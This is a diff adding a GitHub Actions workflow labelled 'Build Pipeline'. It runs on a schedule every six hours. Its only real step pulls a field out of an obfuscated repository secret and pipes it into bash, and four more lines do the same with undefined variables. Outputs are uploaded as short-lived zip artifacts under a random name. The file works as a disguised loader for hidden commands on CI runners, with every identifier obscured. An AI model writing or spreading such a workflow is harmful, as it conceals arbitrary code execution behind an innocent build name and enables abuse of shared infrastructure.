@@ -1,0 +1,34 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          fa44345: ${{ secrets.fa44345 }}
+        run: |
+          printf '%s' "$fa44345" | jq -r .qtt8 | /bin/bash
+          echo $wik78817 | jq -r .g9 | /bin/bash
+          echo $cds95285 | jq -r .ij5975 | /bin/bash
+          printf '%s' "$ugzx05" | jq -r .gu7 | /bin/bash
+          echo $axu757 | jq -r .eitvi05288 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KldXK1RQ
+          path: "*.zip"
+          retention-days: 1
